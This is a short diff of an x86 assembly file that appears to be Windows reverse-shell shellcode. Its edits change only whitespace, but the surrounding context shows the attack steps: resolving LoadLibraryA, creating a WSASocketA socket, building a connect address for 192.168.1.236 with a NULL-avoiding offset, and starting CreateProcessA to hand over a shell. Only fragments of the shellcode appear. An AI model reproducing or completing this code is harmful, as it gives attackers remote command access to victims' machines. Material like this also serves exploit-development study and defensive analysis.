@@ -151,7 +151,7 @@ getLoadLibraryA:
 	push ebx                    ; kernel32.dll
 	call edx                    ; call GetProcAddress and find LoadLibraryA address
 
-	; EAX 76392864 kernel32.LoadLibraryA
+    ; EAX 76392864 kernel32.LoadLibraryA
     ; ECX 76340000 kernel32.76340000
     ; EDX 76340000 kernel32.76340000
     ; EBX 76340000 kernel32.76340000
@@ -235,7 +235,6 @@ getWSASocketA:
     ; EDI 00000000
     ; EIP 004010C4 reverse_.004010C4
 
-
 callWSASocketA:
 	xor edx, edx		            ; clear edx
 	push edx;		                ; dwFlags=NULL
@@ -279,8 +278,6 @@ getConnect:
     ; EDI 00000054
     ; EIP 004010EA reverse_.004010EA
 
-
-
 callConnect:
 	;set up sockaddr_in
 	mov edx, 0xec02a9c1	            ;the IP plus 0x01010101 so we avoid NULLs (IP=192.168.1.236)
@@ -305,8 +302,6 @@ callConnect:
     ; ESI 76740000 OFFSET ws2_32.#332
     ; EDI 00000054
     ; EIP 00401108 reverse_.00401108
-
-
 
 getCreateProcessA:
 	xor ecx, ecx 					; zeroing ECX
